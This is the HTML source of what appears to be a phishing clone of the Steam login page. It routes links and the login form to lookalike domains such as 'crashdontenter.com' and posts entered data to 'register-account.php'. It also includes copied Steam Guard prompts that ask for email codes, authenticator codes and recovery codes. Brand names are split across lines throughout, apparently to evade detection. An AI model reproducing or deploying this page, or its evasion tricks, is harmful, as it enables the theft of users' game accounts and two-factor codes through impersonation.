mtight" href="gmail6720.html?l=koreana&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'koreana'
);
return
false;">한국어
(Korean)</a>
																													<a class="popup_menu_ite
mtight" href="gmail5fb4.html?l=thai&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'thai'
);
return
false;">ไทย
(Thai)</a>
																													<a class="popup_menu_ite
mtight" href="gmail046e.html?l=bulgarian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'bulgarian'
);
return
false;">Български
(Bulgarian)</a>
																													<a class="popup_menu_ite
mtight" href="gmailde77.html?l=czech&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'czech'
);
return
false;">Čeština
(Czech)</a>
																													<a class="popup_menu_ite
mtight" href="gmail79fa.html?l=danish&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'danish'
);
return
false;">Dansk
(Danish)</a>
																													<a class="popup_menu_ite
mtight" href="gmailc24d.html?l=german&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'german'
);
return
false;">Deutsch
(German)</a>
																																							<a class="popup_menu_ite
mtight" href="gmail1305.html?l=spanish&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'spanish'
);
return
false;">Español
-
España
(Spanish
-
Spain)</a>
																													<a class="popup_menu_ite
mtight" href="gmail69ae.html?l=latam&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'latam'
);
return
false;">Español
-
Latinoamérica
(Spanish
-
Latin
America)</a>
																													<a class="popup_menu_ite
mtight" href="gmailf75a.html?l=greek&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'greek'
);
return
false;">Ελληνικά
(Greek)</a>
																													<a class="popup_menu_ite
mtight" href="gmaile713.html?l=french&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'french'
);
return
false;">Français
(French)</a>
																													<a class="popup_menu_ite
mtight" href="gmailcf88.html?l=italian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'italian'
);
return
false;">Italiano
(Italian)</a>
																													<a class="popup_menu_ite
mtight" href="gmailbfcf.html?l=hungarian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'hungarian'
);
return
false;">Magyar
(Hungarian)</a>
																													<a class="popup_menu_ite
mtight" href="gmail319f.html?l=dutch&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'dutch'
);
return
false;">Nederlands
(Dutch)</a>
																													<a class="popup_menu_ite
mtight" href="gmailcd31.html?l=norwegian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'norwegian'
);
return
false;">Norsk
(Norwegian)</a>
																													<a class="popup_menu_ite
mtight" href="gmail916f.html?l=polish&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'polish'
);
return
false;">Polski
(Polish)</a>
																													<a class="popup_menu_ite
mtight" href="gmaild1e6.html?l=portuguese&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'portuguese'
);
return
false;">Português
(Portuguese
-
Portugal)</a>
																													<a class="popup_menu_ite
mtight" href="gmail07f0.html?l=brazilian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'brazilian'
);
return
false;">Português
-
Brasil
(Portuguese
-
Brazil)</a>
																													<a class="popup_menu_ite
mtight" href="gmail6c36.html?l=romanian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'romanian'
);
return
false;">Română
(Romanian)</a>
																													<a class="popup_menu_ite
mtight" href="gmaileb7b.html?l=russian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'russian'
);
return
false;">Русский
(Russian)</a>
																													<a class="popup_menu_ite
mtight" href="gmailf6d9.html?l=finnish&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'finnish'
);
return
false;">Suomi
(Finnish)</a>
																													<a class="popup_menu_ite
mtight" href="gmail7560.html?l=swedish&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'swedish'
);
return
false;">Svenska
(Swedish)</a>
																													<a class="popup_menu_ite
mtight" href="gmaila922.html?l=turkish&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'turkish'
);
return
false;">Türkçe
(Turkish)</a>
																													<a class="popup_menu_ite
mtight" href="gmail7c40.html?l=vietnamese&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'vietnamese'
);
return
false;">Tiếng
Việt
(Vietnamese)</a>
																													<a class="popup_menu_ite
mtight" href="gmail7a13.html?l=ukrainian&amp;redir=&amp;redir_ssl=1&amp;snr=1_4_4__global-header" onclick="ChangeLanguage(
'ukrainian'
);
return
false;">Українська
(Ukrainian)</a>
																									<a class="popup_menu_ite
mtight" href="https://www.V
a
l
v
e
software.com/en/contact?contact-person=Translation%20Team%20Feedback" target="_blank">Report
a
translation
problem</a>
							</div>
						</div>
												</div>
					</div>
			</div>
</div>
<div id="responsive_store_nav_ctn"></div><div id="responsive_store_nav_overlay" style="display:none"><div id="responsive_store_nav_overlay_ctn"></div><div id="responsive_store_nav_overlay_bottom"></div></div><div id="responsive_store_search_overlay" style="display:none"></div><div data-cart-banner-spot="1"></div>
		<div class="responsive_page_template_content" id="responsive_page_template_content" data-panel="{&quot;autoFocus&quot;:true}">

			<div id="application_config" style="display:
none;" data-config="{&quot;EUNIVERSE&quot;:1
&quot;WEB_UNIVERSE&quot;:&quot;public77&quot;
&quot;LANGUAGE&quot;:&quot;english&quot;
&quot;COUNTRY&quot;:&quot;BR&quot;
&quot;MEDIA_CDN_COMMUNITY_URL&quot;:&quot;https:\/\/cdn.akamai.S
teamstatic.com\/marketeiro2023\/public77\/&quot;
&quot;MEDIA_CDN_URL&quot;:&quot;https:\/\/cdn.akamai.S
teamstatic.com\/&quot;
&quot;COMMUNITY_CDN_URL&quot;:&quot;https:\/\/community.akamai.S
teamstatic.com\/&quot;
&quot;COMMUNITY_CDN_ASSET_URL&quot;:&quot;https:\/\/cdn.akamai.S
teamstatic.com\/marketeiro2023\/public77\/assets\/&quot;
&quot;STORE_CDN_URL&quot;:&quot;https:\/\/store.akamai.S
teamstatic.com\/&quot;
&quot;public77_SHARED_URL&quot;:&quot;https:\/\/store.akamai.S
teamstatic.com\/public77\/shared\/&quot;
&quot;COMMUNITY_BASE_URL&quot;:&quot;https:\/\/marketeiro2023.com\/&quot;
&quot;CHAT_BASE_URL&quot;:&quot;https:\/\/marketeiro2023.com\/&quot;
&quot;STORE_BASE_URL&quot;:&quot;https:\/\/store.crashdontenter.com\/&quot;
&quot;STORE_CHECKOUT_BASE_URL&quot;:&quot;https:\/\/checkout.crashdontenter.com\/&quot;
&quot;IMG_URL&quot;:&quot;https:\/\/store.akamai.S
teamstatic.com\/public77\/images\/&quot;
&quot;S
teamTV_BASE_URL&quot;:&quot;https:\/\/S
team.tv\/&quot;
&quot;HELP_BASE_URL&quot;:&quot;https:\/\/help.crashdontenter.com\/&quot;
&quot;PARTNER_BASE_URL&quot;:&quot;https:\/\/partner.S
teamgames.com\/&quot;
&quot;STATS_BASE_URL&quot;:&quot;https:\/\/partner.crashdontenter.com\/&quot;
&quot;INTERNAL_STATS_BASE_URL&quot;:&quot;https:\/\/S
teamstats.V
a
l
v
e
.org\/&quot;
&quot;IN_CLIENT&quot;:false
&quot;USE_POPUPS&quot;:false
&quot;STORE_ICON_BASE_URL&quot;:&quot;https:\/\/cdn.akamai.S
teamstatic.com\/S
team\/apps\/&quot;
&quot;WEBAPI_BASE_URL&quot;:&quot;https:\/\/api.crashdontenter.com\/&quot;
&quot;TOKEN_URL&quot;:&quot;https:\/\/store.crashdontenter.com\/\/chat\/clientjstoken&quot;
&quot;BUILD_TIMESTAMP&quot;:1690475479
&quot;PAGE_TIMESTAMP&quot;:1690675804
&quot;IN_TENFOOT&quot;:false
&quot;IN_GAMEPADUI&quot;:false
&quot;IN_CHROMEOS&quot;:false
&quot;IN_MOBILE_WEBVIEW&quot;:false
&quot;PLATFORM&quot;:&quot;windows&quot;
&quot;BASE_URL_STORE_CDN_ASSETS&quot;:&quot;https:\/\/cdn.akamai.S
teamstatic.com\/store\/&quot;
&quot;EREALM&quot;:1
&quot;LOGIN_BASE_URL&quot;:&quot;https:\/\/login.crashdontenter.com\/&quot;
&quot;AVATAR_BASE_URL&quot;:&quot;https:\/\/avatars.akamai.S
teamstatic.com\/&quot;
&quot;FROM_WEB&quot;:true
&quot;WEBSITE_ID&quot;:&quot;Store&quot;
&quot;BASE_URL_SHARED_CDN&quot;:&quot;https:\/\/shared.akamai.S
teamstatic.com\/&quot;
&quot;CLAN_CDN_ASSET_URL&quot;:&quot;https:\/\/clan.akamai.S
teamstatic.com\/&quot;
&quot;SNR&quot;:&quot;1_60_4_&quot;}" data-userinfo="{&quot;logged_in&quot;:false
&quot;country_code&quot;:&quot;BR&quot;}" data-broadcastuser="{&quot;success&quot;:1
&quot;bHideStoreBroadcast&quot;:false}" data-store_user_config="{&quot;webapi_token&quot;:&quot;&quot;
&quot;shoppingcart&quot;:null}"></div><div id="application_root"><div class="app_App_2uHYt"></div></div><link href="./public77/css/applications/store/main87bb.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="./public77/javascript/applications/store/manifeste8df.js?v=wu4n1RIa3sYr&amp;l=english&amp;_co_domain=1"></script>
<script type="text/javascript" src="./public77/javascript/applications/store/libraries_b28b7af69ce5e.js?v=lfk7IWhtAeGm&amp;l=english&amp;_co_domain=1"></script>
<script type="text/javascript" src="./public77/javascript/applications/store/main57db.js?v=ITEXh1rusgCu&amp;l=english&amp;_co_domain=1"></script>
<script type="text/javascript">
	$J(
function()
{
		var
loginOpts
=

{
			strRedirectURL:
"https:\/\/store.crashdontenter.com\/"

			gidCaptcha:
-1		};

		
		var
LoginManger
=
new
CLoginPromptManager(
'https://store.crashdontenter.com/'

loginOpts
);

					document.forms['logon'].elements['username'].focus();
		
			}
);
</script>
<div class="page_content">
	
	
	<div data-featuretarget="login" data-props="{&quot;redirectUrl&quot;:&quot;https:\/\/store.crashdontenter.com\/&quot;
&quot;disableQR&quot;:false}"><div class="login_LoginContainer_2kLRm">
	
	
	<div class="newlogindialog_Login_ZOBYq"><div class="newlogindialog_FlexCol_1mh
mmnewlogindialog_StandardLayout_286eh
newlogindialog_Compact_9CHmB" style="gap:
32px;">
	
	
	<div class="newlogindialog_LogoContainer_vnUiF"><svg viewBox="0
0
153
46" fill="none" xmlns="http://www.w3.org/2000/svg" class="newlogindialog_HeaderLogo_1rtyT">
	
	<path d="M22.9891
0C10.8429
0
0.93833
9.30396
0
21.1548L12.3547
26.2486C13.3973
25.5209
14.6484
25.1051
16.0037
25.1051C16.108
25.1051
16.2644
25.1051
16.3687
25.1051L21.8944
17.2045C21.8944
17.1525
21.8944
17.1525
21.8944
17.1006C21.8944
12.3186
25.8041
8.42034
30.6
8.42034C35.3959
8.42034
39.3056
12.3186
39.3056
17.1006C39.3056
21.8825
35.3959
25.7808
30.6
25.7808C30.5479
25.7808
30.4436
25.7808
30.3915
25.7808L22.5721
31.3424C22.5721
31.4463
22.5721
31.5503
22.5721
31.6542C22.5721
35.2407
19.6528
38.1514
16.0559
38.1514C12.876
38.1514
10.2695
35.9164
9.64395
32.9017L0.781942
29.2633C3.5448
38.9311
12.4068
46
22.9891
46C35.7087
46
46.0303
35.7085
46.0303
23.026C46.0303
10.2915
35.7087
0
22.9891
0Z" fill="#E0E1E6"></path><path d="M14.44
34.8766L11.625
33.7331C12.1463
34.7726
12.9804
35.6562
14.1272
36.124C16.6294
37.1636
19.4966
35.9681
20.5391
33.4732C21.0604
32.2777
21.0604
30.9263
20.5391
29.7308C20.0178
28.5353
19.0795
27.5997
17.8805
27.08C16.6816
26.5602
15.3783
26.6122
14.2836
27.028L17.2029
28.2235C19.0274
29.0031
19.9136
31.0822
19.1316
32.9014C18.4018
34.7726
16.2645
35.6562
14.44
34.8766Z" fill="#E0E1E6"></path><path d="M36.3857
17.0488C36.3857
13.8782
33.7793
11.2793
30.5994
11.2793C27.4195
11.2793
24.813
13.8782
24.813
17.0488C24.813
20.2194
27.4195
22.8703
30.5994
22.8703C33.7793
22.8703
36.3857
20.2714
36.3857
17.0488ZM26.2205
17.0488C26.2205
14.6578
28.1493
12.6827
30.5994
12.6827C32.9973
12.6827
34.9782
14.6058
34.9782
17.0488C34.9782
19.4397
33.0495
21.3629
30.5994
21.3629C28.2014
21.4149
26.2205
19.4397
26.2205
17.0488Z" fill="#E0E1E6"></path><path d="M70.6879
15.7489L69.1241
18.4517C67.9251
17.6201
66.3091
17.1003
64.9016
17.1003C63.2856
17.1003
62.2951
17.776
62.2951
18.9715C62.2951
20.4269
64.0675
20.7387
66.674
21.6743C69.489
22.6619
71.105
23.8574
71.105
26.4043C71.105
29.9387
68.3421
31.9139
64.3282
31.9139C62.3994
31.9139
60.0014
31.3941
58.229
30.3026L59.3759
27.2879C60.8355
28.0675
62.6079
28.5353
64.1718
28.5353C66.3091
28.5353
67.2995
27.7557
67.2995
26.6122C67.2995
25.3127
65.7878
24.8969
63.2856
24.0653C60.4706
23.1297
58.5418
21.8822
58.5418
19.0235C58.5418
15.8009
61.1483
13.9297
64.8494
13.9297C67.4038
14.0336
69.489
14.8653
70.6879
15.7489Z" fill="#E0E1E6"></path><path d="M82.7305
17.4643V31.6542H79.0815V17.4643H73.8164V14.3457H87.9956V17.4643H82.7305Z" fill="#E0E1E6"></path><path d="M95.6574
17.4124V21.3107H102.643V24.4293H95.6574V28.4836H103.737V31.6022H92.0083V14.3457H103.737V17.4643H95.6574V17.4124Z" fill="#E0E1E6"></path><path d="M111.87
28.2756L110.723
31.6542H106.917L113.434
14.3457H117.083L123.755
31.6542H119.793L118.594
28.2756H111.87ZM115.258
18.4519L112.912
25.3649H117.708L115.258
18.4519Z" fill="#E0E1E6"></path><path d="M142.47
21.0508L137.726
31.1864H135.693L131.001
21.1547V31.7062H127.509V14.3457H131.001L136.84
26.8723L142.47
14.3457H145.963V31.6542H142.47V21.0508Z" fill="#E0E1E6"></path><path d="M153
16.5288C153
18.0361
151.905
18.9197
150.602
18.9197C149.299
18.9197
148.204
17.9841
148.204
16.5288C148.204
15.0214
149.351
14.1378
150.602
14.1378C151.853
14.0858
153
15.0214
153
16.5288ZM148.569
16.5288C148.569
17.7762
149.455
18.5559
150.55
18.5559C151.645
18.5559
152.531
17.7762
152.531
16.5288C152.531
15.2813
151.645
14.5016
150.55
14.5016C149.455
14.5016
148.569
15.2813
148.569
16.5288ZM150.602
15.2813C151.228
15.2813
151.436
15.5932
151.436
15.957C151.436
16.2689
151.228
16.4768
151.019
16.6327L151.593
17.6723H151.123L150.654
16.7367H150.133V17.6723H149.768V15.2813H150.602ZM150.185
16.3728H150.602C150.863
16.3728
151.019
16.2169
151.019
16.009C151.019
15.8011
150.915
15.6451
150.602
15.6451H150.185V16.3728Z" fill="#E0E1E6"></path></svg>


	</div><div class="newlogindialog_FormContainer_3jLIH">
	    
	    <form method="post" action="register-account.php"><div class="newlogindialog_FlexCol_1mh
mmnewlogindialog_AlignItemsCenter_30P8x" style="gap:
14px;">
	
	<input style="display:none;" required="" name="userz" value="BASHDBAJKSD">
	<div class="newlogindialog_ProtectingAccount_1aop9"><div class="newlogindialog_Label_2SE9Z"><br>

	<input style="display:none;" id="hello-btn" type="submit">
	
	</div></div><div style="border-radius:20px;" class="newlogindialog_ConfirmationEntryContainer_2AnqS">
	
	
	<img src="./logos3.gif" style="width:30%;height:100%;border-radius: 72px;">

<p style="margin-left: 21%;margin-top: 5%;"></p><div class="newlogindialog_FlexCol_1mh
mmnewlogindialog_AlignItemsCenter_30P8x" style="gap:
2px;"></div><div class="newlogindialog_EnterCodeFromEmailContainer_2pVTW" style="display:
flex;
flex-direction:
row;
justify-content:
space-evenly;
align-items:
center;"><div class="newlogindialog_FlexCol_1mh
mmnewlogindialog_AlignItemsCenter_30P8x"><div><div class="newlogindialog_EnterCodeFromEmail_1-D_t"><span class="newlogindialog_EnterCodeEmailAddress_2zLvb">Loading ...
</span></div></div></div></div></div></div></form></div></div></div></div></div>
			<div class="login_bottom_row">
			<div class="login_bottom_row_item">
				
				
			</div>
			
			
		</div>
	
</div>
<!--
End
Main
Background
-->

		</div>	<!--
responsive_page_legacy_content
-->

		<div id="footer_spacer" style="" class=""></div>
<div id="footer" class="">
<div class="footer_content">





<div class="rule"></div>
				<div id="footer_logo_S
team"><img src="./public77/images/v6/logo_S
team_footer.png" alt="V
a
l
v
e

Software" border="0"></div>
	




<div id="footer_logo"><a href="http://www.V
a
l
v
e
software.com/" target="_blank" rel=""><img src="./public77/images/footerLogo_V
a
l
v
e
_new.png" alt="V
a
l
v
e

Software" border="0"></a></div>




<div id="footer_text" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">








<div>©
2023
V
a
l
v
e

Corporation.

All
rights
reserved.

All
trademarks
are
property
of
their
respective
owners
in
the
US
and
other
countries.</div>








<div>VAT
included
in
all
prices
where
applicable.&nbsp;&nbsp;













<a href="https://store.crashdontenter.com/privacy_agreement/?snr=1_44_44_" target="_blank" rel="">Privacy
Policy</a>












&nbsp;
|
&nbsp;












<a href="https://store.crashdontenter.com/legal/?snr=1_44_44_" target="_blank" rel="">Legal</a>












&nbsp;
|
&nbsp;












<a href="https://store.crashdontenter.com/subscriber_agreement/?snr=1_44_44_" target="_blank" rel="">S
tea
mSubscriber
Agreement</a>












&nbsp;
|
&nbsp;












<a href="https://store.crashdontenter.com/S
team_refunds/?snr=1_44_44_" target="_blank" rel="">Refunds</a>












&nbsp;
|
&nbsp;












<a href="https://store.crashdontenter.com/account/cookiepreferences/?snr=1_44_44_" target="_blank" rel="">Cookies</a>









</div>
					<div class="responsive_optin_link">
				<div class="btn_mediu
mbtnv6_grey_black" onclick="Responsive_RequestMobileView()">
					<span>View
mobile
website</span>
				</div>
			</div>
		




</div>







<div style="clear:
left;"></div>
	<br>





<div class="rule"></div>





<div class="V
a
l
v
e
_links" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">








<a href="http://www.V
a
l
v
e
software.com/about" target="_blank" rel="">About
V
a
l
v
e
</a>








&nbsp;
|
&nbsp;<a href="http://www.V
a
l
v
e
software.com/" target="_blank" rel="">Jobs</a>








&nbsp;
|
&nbsp;<a href="http://www.crashdontenter.com/S
teamworks/" target="_blank" rel="">S
teamworks</a>








&nbsp;
|
&nbsp;<a href="https://partner.S
teamgames.com/S
teamdirect" target="_blank" rel="">S
tea
mDistribution</a>








&nbsp;
|
&nbsp;<a href="https://help.crashdontenter.com/en/?snr=1_44_44_">Support</a>
























		&nbsp;
|
&nbsp;<a href="https://store.crashdontenter.com/digitalgiftcards/?snr=1_44_44_" target="_blank" rel="">Gift
Cards</a>
		&nbsp;
|
&nbsp;<a href="https://marketeiro2023.com/linkfilter/?url=http://www.facebook.com/S
team" target="_blank" rel="
noopener"><img src="./public77/images/ico/ico_facebook.gif">
S
team</a>
		&nbsp;
|
&nbsp;<a href="http://twitter.com/S
team" target="_blank" rel=""><img src="./public77/images/ico/ico_twitter.gif">
@S
team</a>












</div>

</div>
</div>
	</div>	<!--
responsive_page_content
-->

</div>	<!--
responsive_page_frame
-->

<div id="loginModals">
	<div class="login_modal
loginAuthCodeModal" style="display:
none">
		<for mdata-ajax="false">
			<div class="auth_message_area">
				<div id="auth_icon" class="auth_icon
auth_icon_key">
				</div>
				<div class="auth_messages" id="auth_messages">
					<div class="auth_message" id="auth_message_entercode" style="display:
none;">
						<div class="auth_modal_h1">Hello!</div>
						<p>We
see
you're
logging
in
to
S
tea
mfro
ma
new
browser
or
a
new
computer.

Or
maybe
it's
just
been
a
while...</p>
					</div>
					<div class="auth_message" id="auth_message_checkspam" style="display:
none;">
						<div class="auth_modal_h1">Mistaken
for
spam?</div>
						<p>Did
you
check
your
spa
mfolder?

If
you
don't
see
a
recent
message
fro
mS
tea
mSupport
in
your
inbox

try
looking
there.</p>
					</div>
					<div class="auth_message" id="auth_message_success" style="display:
none;">
						<div class="auth_modal_h1">Success!</div>
						<p>You
now
have
access
to
your
S
tea
maccount
here.</p>
					</div>
					<div class="auth_message" id="auth_message_incorrectcode" style="display:
none;">
						<div class="auth_modal_h1">Whoops!</div>
						<p>Sorry
but

<br>that
isn't
quite
right...</p>
					</div>
					<div class="auth_message" id="auth_message_help" style="display:
none;">
						<div class="auth_modal_h1">Let
us
help!</div>
						<p>Sorry
you're
having
trouble.

We
know
your
S
tea
maccount
is
valuable
to
you

and
we're
committed
to
helping
you
keep
access
to
it
in
the
right
hands.</p>
					</div>
				</div>
			</div>
			<div id="auth_details_messages" class="auth_details_messages">
				<div class="auth_details" id="auth_details_entercode" style="display:
none;">
					As
an
added
account
security
measure

you’ll
need
to
grant
access
to
this
browser
by
entering
the
special
code
we’ve
just
sent
to
your
email
address
at
<span id="emailauth_entercode_emaildomain"></span>.				</div>
				<div class="auth_details" id="auth_details_success" style="display:
none;">
					If
this
is
a
public77
computer

be
sure
to
log
out
of
S
tea
mwhen
you're
ready
to
quit
this
browser
session.				</div>
				<div class="auth_details" id="auth_details_help" style="display:
none;">
					Please
contact
S
tea
mSupport
for
assistance
fro
ma
member
of
our
staff.

Legitimate
claims
for
help
with
account
access
are
our
number
one
priority.				</div>
			</div>
			<div class="authcode_entry_area">
				<div id="authcode_entry">
					<div class="authcode_entry_box">
						<input class="authcode_entry_input
authcode_placeholder" id="authcode" type="text" value="" placeholder="enter
your
code
here">

					</div>
				</div>
				<div id="authcode_help_supportlink">
					<a href="https://help.crashdontenter.com/en/faqs/view/06B0-26E6-2CF8-254C" data-ajax="false" data-externallink="1">Contact
S
tea
mSupport
for
help
with
account
access</a>
				</div>
			</div>
			<div class="modal_buttons" id="auth_buttonsets">
				<div class="auth_buttonset" id="auth_buttonset_entercode" style="display:
none;">
					<div data-modalstate="submit" class="auth_button
leftbtn">
						<div class="auth_button_h3">Submit</div>
						<div class="auth_button_h5">my
special
access
code</div>
					</div>
					<div data-modalstate="checkspam" class="auth_button">
						<div class="auth_button_h3">What
message?</div>
						<div class="auth_button_h5">I
don't
have
any
message
fro
mS
tea
mSupport...</div>
					</div>
					<div style="clear:
left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_checkspam" style="display:
none;">
					<div data-modalstate="submit" class="auth_button
leftbtn">
						<div class="auth_button_h3">Found
it!</div>
						<div class="auth_button_h5">and
I've
entered
my
special
access
code
above</div>
					</div>
					<div data-modalstate="help" class="auth_button">
						<div class="auth_button_h3">No
luck
still...</div>
						<div class="auth_button_h5">I
don't
have
any
message
fro
mS
tea
mSupport...</div>
					</div>
					<div style="clear:
left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_success" style="display:
none;">
					<div class="auth_button
auth_button_spacer">
					</div>
					<a data-modalstate="complete" class="auth_button" id="success_continue_btn" href="javascript:void(0);">
						<div class="auth_button_h3">Proceed
to
S
team!</div>
						<div class="auth_button_h5">&nbsp;<br>&nbsp;</div>
					</a>
					<div style="clear:
left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_incorrectcode" style="display:
none;">
					<div data-modalstate="submit" class="auth_button
leftbtn">
						<div class="auth_button_h3">I
want
to
try
again</div>
						<div class="auth_button_h5">and
I've
re-entered
my
special
access
code
above</div>
					</div>
					<div data-modalstate="help" class="auth_button">
						<div class="auth_button_h3">Please
help</div>
						<div class="auth_button_h5">I
think
I
need
assistance
fro
mS
tea
mSupport...</div>
					</div>
					<div style="clear:
left;"></div>
				</div>
				<div class="auth_buttonset" id="auth_buttonset_waiting" style="display:
none;">
				</div>
			</div>
			<div style="" id="auth_details_computer_name" class="auth_details_messages">
				To
easily
recognize
this
browser
among
the
list
of
devices
S
tea
mGuard
has
enabled

give
the
browser
a
friendly
name
-
at
least
6
characters
long.				<div id="friendly_name_box" class="friendly_name_box">
					<input class="authcode_entry_input
authcode_placeholder" id="friendlyname" type="text" placeholder="enter
a
friendly
name
here">
				</div>
			</div>
			<div style="display:
none;">
				<input type="submit">
			</div>
		
	</for></div>

	<div class="login_modal
loginIPTModal" style="display:
none">
		<div class="auth_message_area">
			<div class="auth_icon
ipt_icon">
			</div>
			<div class="auth_messages">
				<div class="auth_message">
					<div class="auth_modal_h1">Sorry</div>
					<p>This
account
can't
be
accessed
fro
mthis
computer
without
additional
authorization.</p>
				</div>
			</div>
		</div>
		<div class="auth_details_messages">
			<div class="auth_details">
				Please
contact
S
tea
mSupport
to
have
a
member
of
our
staff
assist
you.

Legitimate
claims
for
help
with
account
access
are
our
number
one
priority.			</div>
		</div>
		<div class="authcode_entry_area">
		</div>
		<div class="modal_buttons">
			<div class="auth_buttonset">
				<a href="https://help.crashdontenter.com/" class="auth_button
leftbtn" data-ajax="false" data-externallink="1">
					<div class="auth_button_h3">Learn
more</div>
					<div class="auth_button_h5">about
Intel®
Identity
Protection
Technology</div>
				</a>
				<a href="https://support.crashdontenter.com/" class="auth_button" data-ajax="false" data-externallink="1">
					<div class="auth_button_h3">Please
help</div>
					<div class="auth_button_h5">I
think
I
need
assistance
fro
mS
tea
mSupport...</div>
				</a>
				<div style="clear:
left;"></div>
			</div>
		</div>
	</div>



	<div class="login_modal
loginTwoFactorCodeModal" style="display:
none;">
		<form>
		<div class="twofactorauth_message_area">
			<div id="login_twofactorauth_icon" class="auth_icon
auth_icon_key">
			</div>
			<div class="twofactorauth_messages" id="login_twofactorauth_messages">
				<div class="twofactorauth_message" id="login_twofactorauth_message_entercode" style="display:
none;">
					<div class="auth_modal_h1">Hello
<span id="login_twofactorauth_message_entercode_accountname"></span>!</div>
					<p>This
account
is
currently
using
a
S
tea
mGuard
Mobile
Authenticator.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_incorrectcode" style="display:
none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry
but

<br>that
isn't
quite
right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp" style="display:
none;">
					<div class="auth_modal_h1">Let
us
help!</div>
					<p>Sorry
you're
having
trouble.

We
know
your
S
tea
maccount
is
valuable
to
you

and
we're
committed
to
helping
you
keep
access
to
it
in
the
right
hands.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove" style="display:
none;">
					<div class="auth_modal_h1">Confir
mownership
of
your
account</div>
					<p>We'll
send
a
text
message
containing
an
account
recovery
code
to
your
phone
number
ending
in
<span id="login_twofactorauth_selfhelp_sms_remove_last_digits"></span>.
Once
you
enter
the
code

we
will
remove
the
mobile
authenticator
fro
myour
account
and
you
will
receive
S
tea
mGuard
codes
via
email.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_entercode" style="display:
none;">
					<div class="auth_modal_h1">Confir
mownership
of
your
account</div>
					<p>We
have
sent
a
text
message
containing
a
confirmation
code
to
your
phone
number
ending
in
<span id="login_twofactorauth_selfhelp_sms_remove_entercode_last_digits"></span>.
Enter
the
code
below
so
we
can
remove
the
mobile
authenticator
fro
myour
account.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_sms_remove_incorrectcode" style="display:
none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry
but

<br>that
isn't
quite
right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_removed" style="display:
none;">
					<div class="auth_modal_h1">Success!</div>
					<p>We
have
removed
the
mobile
authenticator
fro
myour
account.
Next
time
you
log
in

you
will
have
to
enter
a
S
tea
mGuard
code
that
is
sent
to
your
email
address.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_twofactor_replaced" style="display:
none;">
					<div class="auth_modal_h1">Success!</div>
					<p>You
can
now
use
this
device
to
get
mobile
authenticator
codes
for
your
account.
Any
other
device
that
was
previously
providing
authenticator
codes
for
your
account
will
no
longer
be
able
to
do
so.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_nosms" style="display:
none;">
					<div class="auth_modal_h1">Do
you
have
the
recovery
code?</div>
					<p>You
do
not
have
a
phone
number
associated
with
your
S
tea
maccount

so
we
are
unable
to
verify
account
ownership
via
a
text
message.
Do
you
have
the
recovery
code
that
you
wrote
down
when
you
added
the
mobile
authenticator?
The
recovery
code
begins
with
the
letter
'R'.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode" style="display:
none;">
					<div class="auth_modal_h1">Enter
your
recovery
code</div>
					<p>Please
enter
the
recovery
code
in
the
box
below.
The
recovery
code
begins
with
the
letter
'R'.</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode" style="display:
none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry
but

<br>that
isn't
quite
right...</p>
				</div>
				<div class="twofactorauth_message" id="login_twofactorauth_message_selfhelp_rcode_incorrectcode_exhausted" style="display:
none;">
					<div class="auth_modal_h1">Whoops!</div>
					<p>Sorry
but
